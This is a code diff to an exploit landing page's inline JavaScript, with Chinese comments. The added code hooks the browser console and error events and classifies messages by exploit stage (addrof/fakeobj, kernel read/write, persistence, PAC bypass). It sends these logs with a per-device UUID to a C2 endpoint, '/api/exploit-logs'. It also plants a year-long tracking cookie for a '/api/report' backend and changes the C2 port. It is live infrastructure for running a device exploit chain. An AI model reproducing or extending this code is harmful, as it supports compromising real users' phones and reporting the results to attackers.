@@ -52,6 +52,235 @@
             }
         } catch(e) {}
     })();
+    /* ===== exploit console logs 采集并上报到 C2 /api/exploit-logs ===== */
+    (function () {
+        var LOG_ENDPOINT = (window.location.origin || '') + '/api/exploit-logs';
+        var LS_KEY = 'ds_exploit_logs_pending_v1';
+        var DEVICE_UUID = '';
+        var QUEUE = [];
+        var FLUSH_THRESHOLD = 50;       // 单批最大
+        var FLUSH_INTERVAL_MS = 1000;   // 1 秒定时
+        var MAX_QUEUE_IN_MEM = 5000;    // 内存队列上限
+        var MAX_QUEUE_IN_LS = 5000;     // localStorage 积压上限
+        var PHASE_RE = /^\s*\[?\s*(STAGE[123]|LOADER|PAC|C2|EXPLOIT|PAYLOAD|FETCH|REPORT|POC|DEBUG)\s*\]?\s*[:：\- ]?/i;
+        var timer = null;
+        var flushInflight = false;
+
+        function getDeviceUuid() {
+            if (DEVICE_UUID) return DEVICE_UUID;
+            try {
+                var qs = window.location.search.substring(1);
+                var params = {};
+                if (qs) qs.split('&').forEach(function (p) {
+                    var kv = p.split('=');
+                    if (kv[0]) params[decodeURIComponent(kv[0])] = decodeURIComponent(kv.slice(1).join('='));
+                });
+                var ck = {};
+                document.cookie.split(';').forEach(function (c) {
+                    c = c.trim(); if (!c) return;
+                    var kv = c.split('=');
+                    if (kv[0]) ck[kv[0].trim()] = kv.slice(1).join('=').trim();
+                });
+                var du = params.device_uuid || params.deviceUUID || params.device || params.uuid || ck.ds_uuid;
+                if (!du) try { du = localStorage.getItem('ds_uuid'); } catch (e) {}
+                if (du && /^[0-9a-fA-F-]{8,}$/.test(String(du))) {
+                    DEVICE_UUID = String(du);
+                }
+            } catch (e) {}
+            return DEVICE_UUID;
+        }
+
+        function detectPhase(msg) {
+            if (!msg) return '';
+            var s = String(msg);
+            var m = s.match(PHASE_RE);
+            if (m) return m[1].toUpperCase();
+            // 粗略通过关键字猜
+            if (/(stage\s*1|addrof|fakeobj|mach-o|jit code pointer)/i.test(s)) return 'STAGE1';
+            if (/(stage\s*2|phys\s*read|phys\s*write|kcall|krw|kernel\s*slide)/i.test(s)) return 'STAGE2';
+            if (/(stage\s*3|post\s*exploit|install\s*persistence|ds_agent|payload\s*deployed)/i.test(s)) return 'STAGE3';
+            if (/(pac|pointer\s*auth|arm64e)/i.test(s)) return 'PAC';
+            if (/(download|fetch|xhr|GET\s+|HTTP)/i.test(s)) return 'FETCH';
+            if (/(loader|script\s+injection|eval\s*\()/i.test(s)) return 'LOADER';
+            return '';
+        }
+
+        function pushLog(level, args) {
+            try {
+                var msg = '';
+                try {
+                    msg = Array.prototype.slice.call(args).map(function (a) {
+                        try {
+                            if (a == null) return String(a);
+                            if (typeof a === 'string' || typeof a === 'number' || typeof a === 'boolean') return String(a);
+                            if (a instanceof Error) return (a.name || 'Error') + ': ' + (a.message || '') +
+                                (a.stack ? '\n' + a.stack : '');
+                            try { return JSON.stringify(a); } catch (e2) { return String(a); }
+                        } catch (e) { return String(a); }
+                    }).join(' ');
+                } catch (e) {}
+                if (!msg) return;
+                var du = getDeviceUuid();
+                if (!du) return; // 没拿到 device_uuid 就不报（还没初始化）
+                var entry = {
+                    ts: Date.now(),
+                    level: level && String(level).toLowerCase() || 'log',
+                    message: String(msg).slice(0, 32000),
+                    phase: detectPhase(msg),
+                };
+                QUEUE.push(entry);
+                if (QUEUE.length > MAX_QUEUE_IN_MEM) {
+                    // 队列太大，截断保留最新的
+                    QUEUE.splice(0, QUEUE.length - MAX_QUEUE_IN_MEM);
+                }
+                if (QUEUE.length >= FLUSH_THRESHOLD) {
+                    scheduleFlush(0);
+                }
+            } catch (e) {}
+        }
+
+        // 拦截 console.*
+        try {
+            var origLog = console.log, origInfo = console.info, origDebug = console.debug;
+            var origWarn = console.warn, origError = console.error;
+            function safeApply(fn, ctx, a) { try { return fn.apply(ctx, a); } catch (e) {} }
+            console.log   = function () { safeApply(origLog,   console, arguments); pushLog('log',   arguments); };
+            console.info  = function () { safeApply(origInfo,  console, arguments); pushLog('info',  arguments); };
+            console.debug = function () { safeApply(origDebug, console, arguments); pushLog('debug', arguments); };
+            console.warn  = function () { safeApply(origWarn,  console, arguments); pushLog('warn',  arguments); };
+            console.error = function () { safeApply(origError, console, arguments); pushLog('error', arguments); };
+            // 捕获 window uncaught exception，作为 error 级别上报
+            try {
+                window.addEventListener('error', function (e) {
+                    try {
+                        var msg = (e.error && e.error.stack) ?
+                            String((e.message || 'uncaught error') + '\n' + e.error.stack) :
+                            String((e.message || 'uncaught error') + ' @ ' + (e.filename || '') + ':' + (e.lineno || '') + ':' + (e.colno || ''));
+                        pushLog('error', [msg]);
+                    } catch (e2) {}
+                });
+                window.addEventListener('unhandledrejection', function (e) {
+                    try {
+                        var r = (e && e.reason != null) ? e.reason : 'unhandled promise rejection';
+                        pushLog('error', ['(unhandledrejection)', r]);
+                    } catch (e2) {}
+                });
+            } catch (e) {}
+        } catch (e) {}
+
+        function loadLocalStorageBacklog() {
+            try {
+                var raw = localStorage.getItem(LS_KEY);
+                if (!raw) return;
+                var arr = JSON.parse(raw);
+                if (Array.isArray(arr) && arr.length) {
+                    var prepend = arr.slice(-MAX_QUEUE_IN_LS);
+                    QUEUE = prepend.concat(QUEUE);
+                    if (QUEUE.length > MAX_QUEUE_IN_MEM) {
+                        QUEUE.splice(0, QUEUE.length - MAX_QUEUE_IN_MEM);
+                    }
+                }
+            } catch (e) { try { localStorage.removeItem(LS_KEY); } catch (e2) {} }
+        }
+        function saveLocalStorageBacklog(arr) {
+            if (!arr || !arr.length) { try { localStorage.removeItem(LS_KEY); } catch (e) {} return; }
+            try {
+                var toSave = arr.slice(-MAX_QUEUE_IN_LS);
+                localStorage.setItem(LS_KEY, JSON.stringify(toSave));
+            } catch (e) {
+                try { localStorage.removeItem(LS_KEY); } catch (e2) {}
+            }
+        }
+
+        function scheduleFlush(delay) {
+            if (timer) return;
+            timer = setTimeout(function () {
+                timer = null;
+                try { doFlush(); } catch (e) {}
+            }, typeof delay === 'number' ? delay : FLUSH_INTERVAL_MS);
+        }
+
+        function doFlush() {
+            if (flushInflight) return;
+            var du = getDeviceUuid();
+            if (!du) { scheduleFlush(2000); return; }
+            if (!QUEUE.length) { loadLocalStorageBacklog(); if (!QUEUE.length) return; }
+            var batch = QUEUE.slice(0, FLUSH_THRESHOLD);
+            QUEUE.splice(0, batch.length);
+            flushInflight = true;
+            var payload = { device_uuid: du, logs: batch };
+            var xhr = new XMLHttpRequest();
+            try { xhr.open('POST', LOG_ENDPOINT, true); } catch (e) {
+                // endpoint 不可达（可能页面是通过 file:// 打开的？），回存并放弃
+                saveLocalStorageBacklog(batch.concat(QUEUE));
+                flushInflight = false;
+                return;
+            }
+            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+            xhr.timeout = 10000;
+            xhr.onloadend = function () {
+                flushInflight = false;
+                var ok = false;
+                try { ok = xhr.status >= 200 && xhr.status < 300; } catch (e) { ok = false; }
+                if (!ok) {
+                    // 失败：把这批 + 还没发的合并，回存到 localStorage 防止丢（最多 MAX_QUEUE_IN_LS）
+                    var merged = batch.concat(QUEUE);
+                    saveLocalStorageBacklog(merged);
+                } else {
+                    // 成功：如果还有积压的，继续立刻 flush
+                    if (QUEUE.length > 0) scheduleFlush(0);
+                }
+            };
+            try { xhr.send(JSON.stringify(payload)); } catch (e) {
+                flushInflight = false;
+                var merged = batch.concat(QUEUE);
+                saveLocalStorageBacklog(merged);
+            }
+        }
+
+        function tryHardFlush() {
+            // beforeunload / visibilitychange -> sendBeacon（支持更大的 payload，不会被 cancel）
+            var du = getDeviceUuid();
+            if (!du || !QUEUE.length) return;
+            var batch = QUEUE.slice(0, 200);
+            QUEUE.splice(0, batch.length);
+            var payload = { device_uuid: du, logs: batch };
+            try {
+                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                var ok = navigator.sendBeacon && navigator.sendBeacon(LOG_ENDPOINT, blob);
+                if (!ok) throw new Error('sendBeacon not supported / returned false');
+            } catch (e) {
+                // sendBeacon 不行：立即用 sync XHR 试一次（不推荐，但 beforeunload 下必须）
+                try {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', LOG_ENDPOINT, false);
+                    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+                    try { xhr.send(JSON.stringify(payload)); } catch (e2) {}
+                } catch (e2) {
+                    saveLocalStorageBacklog(batch.concat(QUEUE));
+                }
+            }
+        }
+
+        try {
+            loadLocalStorageBacklog();
+            // 定时 flush
+            setInterval(function () { try { scheduleFlush(0); } catch (e) {} }, Math.max(500, FLUSH_INTERVAL_MS));
+            // 页面隐藏 / 卸载 -> 强刷
+            try {
+                window.addEventListener('visibilitychange', function () {
+                    if (document.visibilityState === 'hidden') try { tryHardFlush(); } catch (e) {}
+                });
+                window.addEventListener('pagehide', function () { try { tryHardFlush(); } catch (e) {} });
+                window.addEventListener('beforeunload', function () { try { tryHardFlush(); } catch (e) {} });
+            } catch (e) {}
+            // 启动时立即拿 device_uuid + 初次 flush
+            setTimeout(function () {
+                getDeviceUuid();
+                try { scheduleFlush(200); } catch (e) {}
+            }, 100);
+        } catch (e) {}
+    })();
     </script>
 </head>
 
@@ -541,6 +770,19 @@
                         }
                     });
                 }
+                // Fallback: 如果还是没 UUID（post_exploit.js 还没跑），临时生成一个稳定 UUID
+                // 否则后端 /api/report 会走 unknown-时间戳 兜底，造成重复设备记录
+                if (!duuid) {
+                    var _rua = (navigator && navigator.userAgent) || '';
+                    var _rprefix = /iPhone|iPad|iPod|iOS/i.test(_rua) ? 'ios-' : 'dev-';
+                    duuid = _rprefix + Math.random().toString(16).slice(2, 14) + Math.random().toString(16).slice(2, 14);
+                    try {
+                        var _rexp = new Date(Date.now() + 365 * 24 * 3600 * 1000).toUTCString();
+                        document.cookie = 'ds_uuid=' + duuid + '; Path=/; Expires=' + _rexp + '; SameSite=Lax';
+                    } catch(e) {}
+                    try { localStorage.setItem('ds_uuid', duuid); } catch(e) {}
+                    try { if (window.sessionStorage) { sessionStorage.setItem('ds_uuid', duuid); sessionStorage.setItem('uid', duuid); } } catch(e) {}
+                }
                 var cid = ck.ds_chid ? parseInt(ck.ds_chid, 10) : null;
                 var tid = ck.ds_tpid ? parseInt(ck.ds_tpid, 10) : null;
                 var payload = JSON.stringify({
@@ -597,7 +839,7 @@
                 window._ds_uuid = _uuid;
             }
             window.__dsC2Host = window.location.hostname || window.location.host.split(':')[0] || '127.0.0.1';
-            window.__dsC2Port = (window.location.host.split(':')[1]) || '8080';
+            window.__dsC2Port = (window.location.host.split(':')[1]) || '7070';
         }
         self.setTimeout(async function () {
             var result = 1000;
